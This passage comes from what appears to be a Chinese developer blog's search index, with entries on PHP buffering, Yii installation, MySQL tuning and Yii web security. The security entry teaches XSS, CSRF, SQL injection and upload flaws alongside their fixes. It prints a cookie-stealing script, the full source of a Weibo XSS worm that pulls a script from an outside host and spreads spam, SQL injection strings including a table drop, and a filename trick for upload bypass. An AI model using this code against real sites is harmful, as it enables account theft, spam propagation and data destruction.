程序缓存PHP默认的缓冲区。一直在，几乎不能操作。一个函数对该缓存进行操作：123flush(); #刷新程序缓存Ob_flush(); #输出ob缓冲 如果需要将数据立即在浏览器端显示时。使用 ob_flush() 和 flush() 配合使用。 12345678910// 浏览器在没有收到一定量的数据可能不给渲染// echo str_repeat('--', 1024);for ($i=0; $i &lt; 10; $i++) &#123; echo $i; //刷新ob输出缓存 ob_flush(); //刷新程序缓存 flush(); sleep(1);&#125;]]></content>
      <categories>
        <category>网站优化</category>
      </categories>
      <tags>
        <tag>静态化</tag>
        <tag>ab测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-安全篇]]></title>
    <url>%2F2017%2F07%2F02%2Fyii%2FYii-%E5%AE%89%E5%85%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[xss攻击 想方设法把js注入到页面中，可以通过url(反射性)或者 提交数据(提交的数据会保存在后台，显示在页面)跨站脚本攻击(Cross Site Scripting)将js代码插入到给用户使用的页面中，从而对用户进行攻击 盗取用户账号(使用cookie登陆)将下面代码出入页面，当用户访问这个页面的时候将会把cookie发送给自己，在cookie中寻找自己需要的登陆cookie1234&lt;script&gt;var cookie = document.cookie;window.location.href = 'http://127.0.0.1/index.php?cookie = '+cookie&lt;/script&gt; 将cookie设置成httponly，js将无法读取这条cookie 非法转账 自动转账的代码逻辑，自动填写并确认跳转1234document.getElementById('ipt-search-key').value = 'ding@163.com';//自动填写转账的账户document.getElementById('amount').value = '100';//自动填写转账的金额document.getElementById('reason').value = '劫富济贫';//自动填写原因document.getElementsByClassName('ui-button-text')[0].click();//自动跳转 将javascript注入到其他页面，但是需要注入到用户使用的转账的页面，这个是比较难的，需要使用反射性xxs 反射性xss 原理：将js代码赋值给url需要get传参的key，后台获取到这个key又会原原本本的将这个key输出到前端页面选好需要攻击的网站页面，url需要有get传参的内容，确定后台获取到get传参的key值会将其原原本本的输出到前端页面，这样就可以进行攻击了 将js代码赋值给url的get需要传参的key，例如1234567//urlwww.basic.com/index.php?r=article/post&amp;name=abc&lt;script&gt;alert(&apos;hello world&apos;)&lt;/script&gt;//but，浏览器会智能过滤掉js标签 //可以通过后端设置响应头让其不过滤\YII:$app-&gt;response-&gt;headers-&gt;add(&apos;x-xss-Protection&apos;, &apos;0&apos;);//后端的逻辑是直接将获取到的name直接到页面echo \YII:$app-&gt;request-&gt;get(&apos;name&apos;); 输出的内容可能被编码转换成字符串,导致无法执行例如：12&quot;abc%3Cscript%3Ealert(&apos;hello world&apos;)%3C/script%3E&quot;//%3Cscript%3E即&lt;script&gt; 假设，后台获取到这个name值后将其放进了js中(可以通过实验，查看源码，看后台将获取到的数据放到哪里了)123456789&lt;script&gt;...&#123; ... pageAbsUrl:"...name=abc%3Cscript%3Ealert('hello world')%3C/script%3E" ...&#125;...&lt;/script&gt; 因为，已经有了&lt;script&gt;标签，所以传入的不需要 &lt;script&gt; 标签了，根据放入的位置拼装执行代码最后可执行的代码的样子123456789&lt;script&gt;...&#123; ... pageAbsUrl:"...name=abc",alert('hello world')//" ...&#125;...&lt;/script&gt; 所以需要将url改成1www.basic.com/index.php?r=article/post&amp;name=abc&quot;,alert(&apos;hello world&apos;)// 又一个问题，经过自动编译处理将会把 &quot; 变成 %22 导致无法执行这就需要使用 HTML实体编码HTML实体编码查看HTML实体编码表&quot;可以使用 &amp;quot; 代替但是url会根据 &amp; 进行参数分割可以使用url编码将 &amp; 编码 %26url编码通过查看URL编码表js的 escape()方法 最后，因为获取内容放在 &lt;script&gt; 中，在js环境中是不认识HTML实体编码的，所以还是无法执行但是，如果没有在 &lt;script&gt; 的是可行的 xxs蠕虫攻击xxs worm页面中插入js代码，发布，当用户访问的时候，又会以访问用户的身份发布文章，感染性极强 示例1http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update 使用js的 uneacape() 将转义一下可以看到1&quot;http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;?type=update&quot; 当用户访问这个页面的时候将会去加载 t.js,在t.js中实现逻辑12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function createXHR()&#123; return window.XMLHttpRequest? new XMLHttpRequest(): new ActiveXObject("Microsoft.XMLHTTP");&#125;function getappkey(url)&#123; xmlHttp = createXHR(); xmlHttp.open("GET",url,false); xmlHttp.send(); result = xmlHttp.responseText; id_arr = ''; id = result.match(/namecard=\"true\" title=\"[^\"]*/g); for(i=0;i&lt;id.length;i++)&#123; sum = id[i].toString().split('"')[3]; id_arr += sum + '||'; &#125; return id_arr;&#125;function random_msg()&#123; link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();; var msgs = [ '郭美美事件的一些未注意到的细节：', '建党大业中穿帮的地方：', '让女人心动的100句诗歌：', '3D肉团团高清普通话版种子：', '这是传说中的神仙眷侣啊：', '惊爆!范冰冰艳照真流出了：', '杨幂被爆多次被潜规则:', '傻仔拿锤子去抢银行：', '可以监听别人手机的软件：', '个税起征点有望提到4000：']; var msg = msgs[Math.floor(Math.random()*msgs.length)] + link; msg = encodeURIComponent(msg); return msg;&#125;function post(url,data,sync)&#123; xmlHttp = createXHR(); xmlHttp.open("POST",url,sync); xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); xmlHttp.send(data);&#125;function publish()&#123; url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime(); data = 'content=' + random_msg() + '&amp;pic=&amp;styleid=2&amp;retcode='; post(url,data,true);&#125;function follow()&#123; url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=' + new Date().getTime(); data = 'uid=' + 2201270010 + '&amp;fromuid=' + $CONFIG.$uid + '&amp;refer_sort=profile&amp;atnId=profile'; post(url,data,true);&#125;function message()&#123; url = 'http://weibo.com/' + $CONFIG.$uid + '/follow'; ids = getappkey(url); id = ids.split('||'); for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++)&#123; msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime(); msg = random_msg(); msg = encodeURIComponent(msg); user = encodeURIComponent(encodeURIComponent(id[i])); data = 'content=' + msg + '&amp;name=' + user + '&amp;retcode='; post(msgurl,data,false); &#125;&#125;function main()&#123; try&#123; publish(); &#125; catch(e)&#123;&#125; try&#123; follow(); &#125; catch(e)&#123;&#125; try&#123; message(); &#125; catch(e)&#123;&#125;&#125;try&#123; x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);&#125;catch(e)&#123;&#125;main();var t=setTimeout('location="http://weibo.com/pub/topic";',5000); 预防1.使用 \yii\helpers\Html::encode(&#39;内容&#39;); 进行html实体编码转义2.将过滤掉js的代码 \yii\helpers\HtmlPurifier::process(&#39;内容&#39;); 浏览器认为哪段是js代码，yii就根据浏览器相同的算法识别出js代码 CSRF攻击 原理：。将组装好的url发布到公共可以浏览的地方，当浏览点击这个链接的时候会实现攻击了(如果可以跨过登陆的话，用户可能登陆过并多少天内记录了自动登陆功能，或者刚访问过了那个要攻击网站，这样就跨过登陆了)，也可以通过表单 跨站请求伪造攻击，和xss很相似将执行的url放在页面里，用户点击将会执行，比如说删除的连接，转账的链接，就是简单的一个链接请求可以直接执行，而不需要js来去辅助执行 get类型的CSRF攻击例如，某网上银行的漏洞12http://www.xxxbank.com/index.php?from=zhangsan&amp;to=lisi&amp;money=400//zhangsan转给lisi400块 post类型的CSRF攻击需要用户先登录，仿照需要攻击的网站的表单，设法让用户访问自己的仿照的表单发送给攻击的网站而达成目的 CSRF防御1.判断 Referer 头,但是有时候请求不会携带这个请求头2.防伪措施，请求表单的时候，将防伪标识插入到表单，表单提交的时候进行比对 yii默认是开启防止CSRF攻击的 表单中加入 name = _csrf 的隐藏input标签同时将 _csrf 存入到cookie中，请求的时候两个都会进行携带，进行比对，cookie中的是加过密的，后台获取后进行解密，并和表单进行比对控制器获取 _csrf 的值1\YII::$app-&gt;requrst-&gt;csrfToken; sql注入示例123456789101112131415//根据用户账号密码查询漏洞select * from users where name = 'zhangsan' and password = 'xxxxx'//1.将用户名设置为zhangsan' -- 即可破解 // --在mysql表示注释select * from users where name = 'zhangsan' --' and password = 'xxxxx'//2.将用户名设置为'; drop table users; -- 将会删除users表select * from users where name = ''; drop table users; --' and password = 'xxxxx'//根据关键字查询并有限制的语句select * from articles where score&lt;60 and title like '%关键词%'//1.查询出所有结果将关键词设置为' or 1=1 -- 即可破解 or也可以使用 || 代替 还有就是使用编码导致的(GBK),php将 &#39; 单引号转义后 \&#39; 如果遇到特殊的字符一起，并不能很好会将前面的字符和 \ 组成一个字符，而将 &#39; 暴漏出来，导致入侵 sql防范数据库配置有一个选项，可以配置转义工作发生在php端还是mysql端，在mysql端转义更安全1'emulatePrepare'=&gt;false, 可以通过 wireshark 软件抓包查看发送给mysql的数据 文件上传漏洞Fiddler工具可以抓取浏览器的请求，并进行阻断Rules—&gt;Automatic Breakpoints—&gt;Before Requests 添加断点，在请求发出去前进行阻断，修改后可以Run to Completion继续进行请求 可以修改文件的type 通过系统的漏洞来利用上传漏洞系统在命名文件的时候是不允许使用特殊符号的例如 : ,通过修改器截获的请求，将文件名改成 photo.php:x.jpg ,如果在后端是使用上传的原文件名 name 进行保存的1move_uploaded_file($_FILES[&apos;photo&apos;][&apos;tmp_name&apos;], &apos;./&apos;.$_FILES[&apos;photo&apos;][&apos;name&apos;]); 在保存 photo.php:x.jpg 的时候将会保存成 photo.php 所以尽量不要使用用户给的文件名]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>yii安全</tag>
        <tag>安全</tag>
        <tag>xss</tag>
        <tag>csrf</tag>
        <tag>sql注入</tag>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-安装advanced版本]]></title>
    <url>%2F2017%2F07%2F02%2Fyii%2FYii-%E5%AE%89%E8%A3%85advanced%E7%89%88%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[composer安装首先确保composer可用进入到 php库 查找要安装的插件或项目如：yii2-app-advanced,点击进入查询出的条目，会显示安装的命令1composer create-project yiisoft/yii2-app-advanced 进入终端,进入到要放置项目的目录执行此命令 安装途中，由于安装文件较大需要使用github账号辅助，教程github获取token教程 安装完成后初始化:进入到项目中执行1php init 配置站点hosts 文件添加站点httpd-vhosts.conf 配置站点1234567891011121314&lt;VirtualHost *:80&gt; ServerAdmin webmaster@dummy-host2.example.com DocumentRoot &quot;/Users/echo-ding/Documents/ding/www/ibunao&quot; ServerName www.ibunao.me ErrorLog &quot;/private/var/log/www.ibunao.me-error_log&quot; CustomLog &quot;/private/var/log/www.ibunao.me-access_log&quot; common&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; ServerAdmin webmaster@dummy-host2.example.com DocumentRoot &quot;/Users/echo-ding/Documents/ding/www/yii/first/frontend/web&quot; ServerName www.yiifirst.com ErrorLog &quot;/private/var/log/www.yiifirst.com-error_log&quot; CustomLog &quot;/private/var/log/www.yiifirst.com-access_log&quot; common&lt;/VirtualHost&gt; 配置数据库在配置文件中的 component 组件下配置1234567'db' =&gt; [ 'class' =&gt; 'yii\db\Connection', 'dsn' =&gt; 'mysql:host=localhost;dbname=yiifirst', 'username' =&gt; 'root', 'password' =&gt; '******', 'charset' =&gt; 'utf8',], 此时数据库中只有12345678910111213mysql&gt; show tables;+--------------------+| Tables_in_yiifirst |+--------------------+| test |+--------------------+mysql&gt; desc test;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | NO | PRI | NULL | || test | varchar(45) | NO | | | |+-------+-------------+------+-----+---------+-------+ 进入到安装目录执行 php yii migrate 命令生成user表1234567891011121314151617ding:~ echo-ding$ cd Documents/ding/www/yii/first/ding:first echo-ding$ php yii migrateYii Migration Tool (based on Yii v2.0.12)Creating migration history table &quot;migration&quot;...Done.Total 1 new migration to be applied: m130524_201442_initApply the above migration? (yes|no) [no]:y*** applying m130524_201442_init &gt; create table &#123;&#123;%user&#125;&#125; ... done (time: 0.036s)*** applied m130524_201442_init (time: 0.044s)1 migration was applied.Migrated up successfully. 执行成功后查看数据库，将会多出两张表12345678mysql&gt; show tables;+--------------------+| Tables_in_yiifirst |+--------------------+| migration || test || user |+--------------------+ 安装插件和安装yii相似，先在网站上查找需要安装的插件，然后进入yii项目中执行安装命令1234567891011121314composer require ibunao/yii2-weditor``` redis 、mongodb配置```php&apos;redis&apos; =&gt; [ &apos;class&apos; =&gt; &apos;yii\redis\Connection&apos;, &apos;hostname&apos; =&gt; &apos;localhost&apos;, &apos;port&apos; =&gt; 6379, &apos;database&apos; =&gt; 0,],&apos;mongodb&apos; =&gt; [ &apos;class&apos; =&gt; &apos;\yii\mongodb\Connection&apos;, &apos;dsn&apos; =&gt; &apos;mongodb://ding:ding@localhost:27017/test&apos;,], 归档安装在window下安装的 将php.exe所在文件夹配置到环境变量中 进入到advanced版本的根目录init所在目录 导航栏cmd进入cmd窗口 输入 php init 确认,一步一步选择执行就好了 创建数据库，配置数据库 输入 php yii migrate 将会创建两张表一张user表 composerwindow下的composer安装使用 手动下载安装 下载composer.phar文件 配置环境变量：在window中path配置php的全局变量 php.exe所在文件夹 D:\wamp\bin\php\php5.5.12配置composer的全局变量 composer.phar文件放置的文件夹 D:\wamp\www\yii在cmd下 在git bash中还是找不到命令输入 composer -v 会报没有这个命令这时需要进入放置 composer.phar 文件的文件夹内，cmd中输入 echo @php &quot;%~dp0composer.phar&quot; %*&gt;composer.bat 目录中会创建一个 composer.bat 批处理文件这时就ok了，可以全局的使用composer命令了为了加快下载速度使用镜像网站，进行全局配置 cmd中输入 1composer config -g repo.packagist composer https://packagist.phpcomposer.com 可以在 https://packagist.org/ 上输入yiisoft/yii2来搜索yii的扩展程序包使用composer安装composer之 require 命令 安装require命令 不需要 json文件 直接安装进到项目根目录里面有composer.json 然后php 找到composer.phar文件所在 require 安装的包 版本号默认安装在项目的vendor目录中1D:\wamp\www\yii\test1\basic&gt;php ../../composer.phar require yiisoft/yii2-gii 2.0.5 install 命令 根据 json 文件下载 当下载的比较多的时候可以根据json文件进行下载，会自动循环读出下载的插件中的json，然后继续下载所需依赖 create-project 以项目的模式将文件下载到本地]]></content>
      <categories>
        <category>yii</category>
        <category>composer</category>
      </categories>
      <tags>
        <tag>yii安装</tag>
        <tag>composer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站优化-Mysql]]></title>
    <url>%2F2017%2F07%2F02%2Fmysql%2F%E7%BD%91%E7%AB%99%E4%BC%98%E5%8C%96-Mysql%2F</url>
    <content type="text"><![CDATA[4个方向的优化 其一：设计方面。存储引擎的选择，列类型的选择 其二：功能方面。索引，查询缓存，分区。 其三：架构层面。读写分离，负载均衡。 其四：SQL层面。经验。 设计方面存储引擎的选择 存储数据的格式，方式常用的有两种，innodb 和 MyISAM 查看mysql支持的引擎情况1show engines\G MyISAM引擎 记录按照顺序插入进行存储的 12345678910USE test; #选用数据库CREATE TABLE myisam_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = MYISAM CHARSET=utf8;#myisam引擎的INSERT INTO myisam_1 VALUES (23, '李牧');INSERT INTO myisam_1 VALUES (12, '王翦');INSERT INTO myisam_1 VALUES (34, '廉颇');INSERT INTO myisam_1 VALUES (15, '白起'); 数据和索引分别存储 test 数据库文件夹db.opt 数据库文件myisam_1.frm 表结构文件myisam_1.MYD 数据文件myisam_1.MYI 索引文件 表压缩myisam支持压缩存储制作一张大量数据的表，利用蠕虫复制(自身复制)技术，完成大量数据；1insert into myisam_1 select null,title from myisam_1; 多次执行后查看如果文件大小没有更新，可以刷新表写入到文件1flush table myisam_1; 查看文件大小 工具压缩查找123456find / -name myisampack发现工具目录 /usr/local/Cellar/mysql/5.7.18_1/binmyisampack 打包压缩myisamchk 检测修复 进入到数据库目录中/usr/local/var/mysql/test 可以通过 find / -name *.frm 查找 执行1myisampack myisam_1 //myisam_1是带压缩的表名 最后会显示1Remember to run myisamchk -rq on compressed tables 可以看出数据文件压缩，但是索引文件出问题了，需要重建修复索引1myisamchk -rq myisam_1 修复后索引正常 压缩后为只读表，不能再进行插入操作，仅仅可以完成更快速的查询工作 表解压如果需要对压缩过的表进行修改需要进行解压同样进入到要解压的数据库目录中1myisamchk --unpack myisam_1 执行后即可,如果文件大小没变，需要进入到mysql中执行1flush table 修复表myisam新增数据时，都是在表末尾完成的插入如果存在被删除的记录。所占用的记录空间就会空下来，但是不会再存放记录。最好定时，完成修复表空间漏洞！删除数据后myisam表的大小并不会发生改变 ，需要进行修复进入到需要修复的数据库的目录中12myisamchk -rq myisam_1 #修复索引 myisamchk -r myisam_1 #修复数据 myisam 不支持行锁，支持表锁，导致并发性降低 ；提供高效的查询、插入操作；不擅长大量更新、删除业务； innodb引擎mysql默认存储引擎支持事务，行级锁定，外键 存储机制数据按照主键顺序进行排序导致innodb的表的记录与逐渐索引存在一个结构中(聚簇)插入数据时，因为要额外的执行排序工作，导致插入速度相对较慢 创建innodb表12345678910USE test; #选用数据库CREATE TABLE innodb_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = innodb CHARSET=utf8;#innodb引擎的INSERT INTO innodb_1 VALUES (23, '李牧');INSERT INTO innodb_1 VALUES (12, '王翦');INSERT INTO innodb_1 VALUES (34, '廉颇');INSERT INTO innodb_1 VALUES (15, '白起'); 查看文件 innodb_1.frm innodb的结构文件ibdata1 默认的innodb表空间文件，所有的innodb表的数据和索引都在该文件中(最新的默认为每个表分开存储)innodb_1.ibd innodb表空间文件(每个表单独存储的时候会有这个文件) 如果默认为所有的表存储在一个文件中，可以进行配置来实现每个表分开存储1show variables like 'innodb_file_per_table'; 如果值为 OFF 则为所有表存在一个文件中，进行设置更改即可1set global innodb_file_per_table = 1; innodb额外支持事务，外键约束，行级锁定擅长处理复杂数据完整性，一致性。擅长处理并发。 列类型的选择在满足需求的情况下尽可能占用小的存储空间尽可能使用整数类型整数行的运算速度最快，也可以考虑 Enum枚举 和 Set集合 类型，不过这两种也可以配合代码用数值型实现例如：存储 ipv4； varchar(15) 15+个字节可以将ip转换为int型的 int unsigned 就只需要4个字节ip转整1select inet_aton('192.168.1.234'); 整数转ip1select inet_ntoa(3232236010); 尽可能使用 not nullNull值，特殊值，mysql需要额外的存储空间存储。无论在计算，存储上都需要消耗资源。 逆范式 范式：规范的格式： 满足三范式：1NF：原子性。2NF：消除部分依赖。3NF：消除传递依赖。每张表，存储一类实体的信息。实体间通过关联字段进行联系。 但 有时需要 打破规范，来提升某种操作的效率：例如：1234567891011121314151617181920商品表：GoodsGoods_id, goods_name, cat_id分类表：categoryCat_id, cat_title,业务逻辑：分类列表分类ID，分类标题，分类下商品数量典型的实现：连接查询。Select c.cat_id, c.cat_title, count(g.goods_id) as goods_count from category as c left join goods as g On c.cat_id=g.cat_id group by c.cat_id where Condition如果 在查询分类列表时，通常需要 商品数量：则可以采用下面的设计：在分类表，增加商品数量的字段：分类表：categoryCat_id, cat_title,goods_count每当 商品 增，删，改的时候，修改相关分类的goods_count的值。但是，如果执行查询分类列表了，就不需要 连接操作：Select * from category; 优化根据具体的业务需求对表结构进行优化 功能方面索引在终端执行 select 语句的时候会显示执行时间例如：128388608 rows in set (2.79 sec)执行了2.79秒 可以通过设置索引对查询进行优化 索引就好比字典的目录，通过关键词获取记录所在位置通过使用 数据中的部分数据作为关键字，建立该关键字与数据间位置的对应关系，称之为索引。 在没有索引的情况下，定位记录，需要采用的是全表扫描，从第一条记录扫描到最后一条记录，确定要找的数据而索引的关键词是排序过的，查找的时候先在索引中进行检索，快速的定位该关键词对应的记录位置 索引的增删改查看 mysql基础 执行计划在执行sql之前，mysql会形成执行计划，内包含了当前的sql执行所采用的策略 mysql执行计划获取通过 explain select 语法1explain select * from test where id = 123456\G 123456789101112131415mysql&gt; explain select * from myisam_1 where id = 123456\G*************************** 1. row *************************** id: 1 select_type: SIMPLE table: myisam_1 partitions: NULL type: const #这是重要的列，显示连接使用了何种类型。从最好到最差的连接类型为const、eq_reg、ref、range、 indexhe和ALL，all为全表扫描possible_keys: PRIMARY #查询可能会使用到索引 key: PRIMARY #实际使用的索引 key_len: 4 #使用的索引的长度。在不损失精确性的情况下，长度越短越好 ref: const rows: 1 #MYSQL认为必须检查的用来返回请求数据的行数 filtered: 100.00 Extra: NULL #关于MYSQL如何解析查询的额外信息1 row in set, 1 warning (0.00 sec) 索引使用场景条件检索 wherewhere 后的字段如果有索引是可以使用索引的 排序 order byorder by 后的字段如果有索引是可以使用索引的 联表join 关联字段联接查询是，关联字段 (on后面的条件) 可以使用索引两个表的关联字段都要创建索引 索引使用语法细节字段独立字段需要使用索引时，要求，字段独立存在于表达式的一侧。不能参与表达式运算。函数调用。例如：12where id = 123456; #字段独立where id+1 = 123455; #字段未独立 左原则like模糊查询匹配字符串，左侧必须要固定才可以使用索引。即 like abc% 复合索引创建复合索引时，在使用索引的时候左边的字段才能直接使用该索引。左边字段确定时，右边字段的索引才可以使用。 原因：复合索引的关键字顺序，先按照左边字段排序，如果左边字段相同，则按照右边字段排，以此类推。 or原则要保证 OR两侧的条件表达式中的字段都有索引可以使用，才会用到索引。 mysql自动判断当搜索的记录数比较多时，mysql可能会放弃使用索引来减少大量的随机io开销，而选择使用顺序开销来代替例如：1where empno &gt; 1121212; 如果查询的记录数太多，会放弃索引 前缀索引 可以使用 某个字段的前一部分（左边）数据，作为索引的关键字，而不是使用全部的字段内容。称之为前缀索引。字段 32 字节长度。只使用前10个长度，作为索引关键字。目的：减少 关键字的长度，索引的速度就会提升！实际中，前缀 具有 足够的标识度，才可以使用前缀索引。 例如：以 密码为例： 首先需要计算当前缀达到多长时，标识度就够了。 先计算整体的标识度 1select 总记录条数／count(distinct epassword) from emp; #计算总条数除以不重复密码的比值 计算使用不同的前缀是的标识度的值，找到最接近的即可 1select 总记录条数／count(distinct substring(epassword, 1, n)) from emp; 随着 n 的不断增大，将会越来越接近整体标识度，并且随着增大标识度将会不变，这时去不变时的最小值最为前缀长度 建立前缀索引 1alter table emp add index 'index_password' (epassword(n)); #n为计算出的长度 查询缓存mysql服务器提供的可以缓存查询结果的缓存区12345678910mysql&gt; show variables like 'query_cache_%';+------------------------------+---------+| Variable_name | Value |+------------------------------+---------+| query_cache_limit | 1048576 || query_cache_min_res_unit | 4096 || query_cache_size | 1048576 |#缓存大小| query_cache_type | OFF |#开关| query_cache_wlock_invalidate | OFF |+------------------------------+---------+ 看出默认是开着的 设置配置变量：12set global query_cache_type = 1;#打开set global query_cache_size = 1024*1024*64;--64M 注意：一旦开启查询缓存，则只要执行的时Select操作，通常结果都会被缓存。无论客户端是否要求。 实际使用时：有些数据仅仅需要使用一次。数据很大。不希望数据被缓存。通过 SQL_NO_CACHE 语法，进行提示 MySQL 该select不需要缓存1select sql_no_cache from emp where empno = 12345; 动态数据不能缓存1select * ,now() from emp where empno=12345; 缓存是基于 select 语句的如果多打了空格或字母大小写不一样都会导致不会使用缓存 索引的状态的查看123456789101112mysql&gt; show status like 'handler_read_%';+-----------------------+----------+| Variable_name | Value |+-----------------------+----------+| Handler_read_first | 4 || Handler_read_key | 5 |#该选项值高 则证明系统高效使用了索引| Handler_read_last | 0 || Handler_read_next | 0 || Handler_read_prev | 0 |#上面的数量越高，索引利用率越高| Handler_read_rnd | 0 |#下面两项数值高的需要优化，执行全表扫面的| Handler_read_rnd_next | 27264190 |+-----------------------+----------+ 管理查询缓存12345678910111213mysql&gt; show status like 'Qcache_%';+-------------------------+---------+| Variable_name | Value |+-------------------------+---------+| Qcache_free_blocks | 1 || Qcache_free_memory | 1031832 || Qcache_hits | 0 | #查询命中数| Qcache_inserts | 0 | #缓存项数量| Qcache_lowmem_prunes | 0 || Qcache_not_cached | 30 || Qcache_queries_in_cache | 0 || Qcache_total_blocks | 1 |+-------------------------+---------+ 重置／清空缓存1reset query cache; 缓存失效如果对数据表进行更改操作(增、删、改)，则会删除该表对应的所有的缓存； 分表分区当表中的记录数很多时，采用多张表进行存储，策略就是分表策略 将大量数据按照算法分开存储，可以提高查询的效率和io开销吧 mysql服务器可以实现表的分区分区后mysql服务器将会根据分区算法和数量创建多个表，然后像普通正常使用就行 分区将一个表分成多个区(partition),将数据分散到不同的区中。就是横向分表区：就是一个物理表， 4种分区算法key、hash、range、list hash分区分区的字段要求是整数类型的如果是要对非整型字段进行hash分区，需要自己用表达式将非整形转换成整形12345678910create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--通过id将分区划分成10个partition by hash(id) partition 10;--或通过 birthday 划分成10个 ,要将date转换成int类型的partition by hash(YEAR(birthday)) partition 10; key分区针对任意类型字段与hash相似，只不过转成 int 的函数不是用户指定，而是由mysql指定12345678910create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--通过id将分区划分成10个partition by key(id) partition 10;--或通过 birthday 划分成10个partition by key(birthday) partition 10; range范围分区为每一个分区的条件指定一个范围123456789101112131415create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id, birthday) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--或通过 birthday 根据年代划分partition by key(YEAR(birthday)) ( partition p_old values less than (1970), -- 小于 &lt; (value) partition p_70 values less than (1980), partition p_80 values less than (1990), partition p_90 values less than (2000), partition p_new values less than MAXVALUE, -- 最大值); list 列表值条件分区12345678910111213create table student ( id int unsigned not null auto_increment, name varchar(32) not null default '', birethday date not null default '0000-00-00', primary key (id, birthday) --primary key(id, birthday) 分区的字段要包含在主键中) engine=myisam charset=utf8--或通过 birthday 根据月份划分partition by key(month(birthday)) ( partition p_chun values in (3,4), partition p_xia values in (5,6,7,8), partition p_80 values in (9,10), partition p_90 values in (11,12,1,2),); 分区管理求余类型的 hash和key分区类型减少分区将原来的10个分区减少至7个分区123alter table student coalesce partition 3;--查看 show create table student\G 增加分区123alter table add partition partitions 5;--查看 show create table student\G 条件类型的 range和list分区类型添加具体的条件分区123alter table student_list add partition( partition p_undefined values in (0);) 删除具体的条件分区1alter table student_list drop partition p_qiu; 删除分区时会导致分区内的数据同时被删除 垂直分表可以根据表的字段使用情况将一张表垂直拆分成几个表常用信息一个表，不常用信息一个表 架构优化读写分离web项目，读写比例大概 7:1，配置一台住服务器负责写，多台从服务器负责读 负载均衡将访问数据均匀的分配到不同的读服务器，nginx反向代理 mysql配置优化my.ini最大连接数1max_connections = 100; myisam键缓存1key_buffer_size = 55M innodb的缓冲池1innodb_buffer_pool_size = 107M 表文件句柄缓存可以缓存打开的table的句柄1table_cache=256 sql优化找到执行慢的sql将执行超过多久的sql记录下来 1234567mysql&gt; show variables like 'slow_query_%';+---------------------+------------------------------------+| Variable_name | Value |+---------------------+------------------------------------+| slow_query_log | OFF |#慢查询开关,默认打开| slow_query_log_file | /usr/local/var/mysql/ding-slow.log |#慢查询日志位置+---------------------+------------------------------------+ 123456mysql&gt; show variables like 'long_query_%';+-----------------+-----------+| Variable_name | Value |+-----------------+-----------+| long_query_time | 10.000000 | #记录 慢 的临界值+-----------------+-----------+ 12set global slow_query_log = 1；#开启慢查询 set long_query_time = 1; #设置记录慢查询时间临界值,超过的将都会记录下来 通过查询慢查询日志，找到需要优化的sql 插入大量数据建议将索引关闭(每条记录维护索引，相比一起维护索引，一起维护更容易)也可以现将索引删除，插入数据后再创建索引 order by null禁止排序group by的时候，默认的按照分组字段排序；执行explain计划可以看到 extra: useing filesort如果排序没有意义，可以通过添加 order by null 来禁用排序 select查询的字段尽可能是自己需要的，尽量不要使用 * 会导致数量变大，拖慢速度 单表查询一次操作仅仅操作一张表，当数据量较大的时候使用连表操作将会导致内存不够单表查询的好处 一次占用一个表，减少并发 消耗内存少 提高查询缓存的利用率缺点由于多次执行sql会多次向mysql服务器进行联接，联接响应也是影响速度的重要原因 能用join的尽量不要用子查询，mysql对子查询的支持不是太好，效率略低]]></content>
      <categories>
        <category>网站优化</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js-闭包]]></title>
    <url>%2F2017%2F07%2F01%2Fjs%2FJS-%E9%97%AD%E5%8C%85%2F</url>
